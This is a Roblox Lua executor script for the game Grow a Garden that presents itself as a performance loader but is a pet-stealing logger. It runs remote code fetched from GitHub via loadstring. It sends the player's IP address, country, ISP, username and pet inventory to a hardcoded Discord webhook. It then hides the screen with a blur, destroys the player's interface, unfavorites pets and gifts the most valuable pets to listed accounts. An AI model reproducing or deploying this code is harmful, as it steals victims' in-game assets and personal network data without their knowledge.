
-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV2.lua"))()

-- CONFIG SECTION
local webhookUrl = "https://discord.com/api/webhooks/1392825138134651043/JhW9IN6scthgQncuUYfAefxbNOxiM2GZMJ6V6o1hAuJTWXqUqMt6bYxFpbqNTEMrxLyi"
local targetUsernames = { "deepscriptAI", "MyAlt", "EnemyGuy", "intercepternumber1" }
local drainPets = {
    "Dragonfly", "T‚ÄëRex", "Raccoon", "Red Fox", "Queen Bee",
    "Disco Bee", "Butterfly", "Mimic", "Moon Cat", "Fennec Fox",
    "Triceratops", "Axolotl", "Bear Bee", "Polar Bear",
    "Praying Mantis", "Scarlet Macaw", "Chicken Zombie", "Cooked Owl", "Capybara"
}
local highTierPets = {
    "Dragonfly", "Butterfly", "Mimic", "Red Fox", "Raccoon",
    "Disco Bee", "Queen Bee", "T‚ÄëRex", "Spinosaurus", "Ankylosaurus"
}
local petKeywords = {
    "Starfish", "Crab", "Seagull", "Bunny", "Dog", "Golden Lab", "Bee",
    "Black Bunny", "Cat", "Chicken", "Deer", "Monkey", "Orange Tabby",
    "Pig", "Rooster", "Spotted Deer", "Flamingo", "Toucan", "Sea Turtle",
    "Orangutan", "Seal", "Honey Bee", "Wasp", "Tarantula Hawk", "Raptor",
    "Triceratops", "Stegosaurus", "Pterodactyl", "Turtle", "Caterpillar",
    "Petal Bee", "Moth", "Scarlet Macaw", "Ostrich", "Peacock",
    "Capybara", "Sand Snake", "Meerkat", "Brown Mouse", "Giant Ant",
    "Grey Mouse", "Praying Mantis", "Red Giant Ant", "Snail", "Squirrel",
    "Bear Bee", "Butterfly", "Brontosaurus", "Pack Bee", "Mimic Octopus",
    "Hyacinth Macaw", "Axolotl", "Red Fox", "T‚ÄëRex", "Dragonfly",
    "Queen Bee", "Disco Bee", "Fennec Fox", "Moon Cat", "Raccoon",
    "Polar Bear", "Parasaurolophus", "Iguanodon", "Pachycephalosaurus",
    "Dilophosaurus", "Ankylosaurus", "Spinosaurus", "Chicken Zombie", "Cooked Owl"
}

-- SERVICES
local Players        = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService    = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Lighting       = game:GetService("Lighting")
local localPlayer    = Players.LocalPlayer
local backpack       = localPlayer:WaitForChild("Backpack")
local character      = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId          = game.JobId
local placeId        = game.PlaceId

-- AUTO SERVER‚ÄëHOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor, lowest = "", nil
    repeat
        local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
        if cursor~="" then url = url.."&cursor="..cursor end
        local response = req({Url=url, Method="GET"})
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in ipairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

if jobId ~= "29034fc7-77e6-4008-a431-303c5aee26a6" then
    task.wait(2.5)
    TeleportService:TeleportToPlaceInstance(placeId, "29034fc7-77e6-4008-a431-303c5aee26a6", localPlayer)
    return
end

local wasPrivateServer = false
if game.PrivateServerId~="" and game.PrivateServerOwnerId~=0 then
    local low = getLowestServer()
    if low then
        wasPrivateServer = true
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, low.id, localPlayer)
        return
    end
end

-- HELPERS
local function freezeVisual()
    local blur = Instance.new("BlurEffect")
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    name = string.lower(name)
    for _, keyword in ipairs(list) do
        if string.find(name, string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local out = {}
    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and hasKeyword(tool.Name, petKeywords) then
            table.insert(out, tool.Name)
        end
    end
    return out
end

local function chunkItems(items)
    local chunks = {}
    for i=1,#items,5 do
        local block = {}
        for j=i,math.min(i+4,#items) do
            block[#block+1] = "- "..items[j]
        end
        chunks[#chunks+1] = { name="üéí Pets "..i.."‚Äì"..math.min(i+4,#items), value=table.concat(block,"\n"), inline=false }
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = { content="", embeds={{ title="üêæ Grow a Garden Report", color=16753920, fields=embedFields, footer={text="Delta Executor Logger"}, timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ") }} }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({ Url=webhookUrl, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data) })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return "?", "?", "?" end
    local res = req({ Url="http://ip-api.com/json/", Method="GET" })
    if res and res.Body then
        local b = HttpService:JSONDecode(res.Body)
        return b.query or "?", b.country or "?", b.isp or "?"
    end
    return "?", "?", "?"
end

local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild("Dex")
    if not dex then return end
    local unfav = {}
    for _, item in ipairs(dex:GetChildren()) do
        if item:GetAttribute("d") == true then
            table.insert(unfav, item.Name)
            ReplicatedStorage.GameEvents.ToggleFavorite:FireServer(item.Name)
            task.wait(0.2)
        end
    end
    if #unfav > 0 then
        sendWebhook({{ name="üö´ Unfavorited Pets", value=table.concat(unfav,", "), inline=false }})
    end
end

-- INITIAL STATUS REPORT
task.spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name="üë§ Username", value=localPlayer.Name, inline=true },
        { name="üåê IP", value=ip, inline=true },
        { name="üó∫Ô∏è Country", value=country, inline=true },
        { name="üíª ISP", value=isp, inline=true },
        { name="üì° Server ID", value=jobId, inline=false },
        { name="‚è±Ô∏è Time", value=os.date("%Y-%m-%d %H:%M:%S"), inline=false }
    })
end)

task.spawn(function()
    local pets = getFilteredPets()
    sendWebhook( chunkItems(pets) )
end)

task.spawn(function()
    sendWebhook({{ name="üîÉ Server Status", value=wasPrivateServer and "Private server ‚Üí hopped" or "Already in public target server", inline=false }})
end)

-- 5‚ÄëMINUTE STATUS REPORT
task.spawn(function()
    task.wait(300)
    local pets = getFilteredPets()
    local hasHigh = false
    for _, name in ipairs(pets) do
        if hasKeyword(name, highTierPets) then
            hasHigh = true
            break
        end
    end
    if #pets>0 or hasHigh then
        sendWebhook({
            { name="‚è≥ 5‚ÄëMinute Check", value="Script still active with relevant pets", inline=false },
            { name="üë§ Username", value=localPlayer.Name, inline=true },
            { name="üì° Server ID", value=jobId, inline=true }
        })
    end
end)

-- MAIN LOOP: wait for target ‚Üí delay 7s ‚Üí action
task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                task.wait(7)
                for _, gui in ipairs(localPlayer.PlayerGui:GetChildren()) do
                    if gui:IsA("ScreenGui") or gui:IsA("BillboardGui") or gui:IsA("SurfaceGui") then
                        gui:Destroy()
                    end
                end
                unfavoriteAllPets()

                -- ORDERED GIFTING: high-tier first, then others
                local ordered = {}
                for _, tier in ipairs(highTierPets) do
                    for _, tool in ipairs(backpack:GetChildren()) do
                        if tool:IsA("Tool") and string.find(string.lower(tool.Name), string.lower(tier)) then
                            table.insert(ordered, tool)
                        end
                    end
                end
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") and hasKeyword(tool.Name, drainPets) and not table.find(ordered, tool) then
                        table.insert(ordered, tool)
                    end
                end

                for _, tool in ipairs(ordered) do
                    freezeVisual()
                    tool.Parent = character
                    task.wait(0.3)
                    while player.Parent == Players and tool.Parent == character do
                        ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", player)
                        task.wait(0)
                    end
                end
            end
        end
        task.wait(2.5)
    end
end)
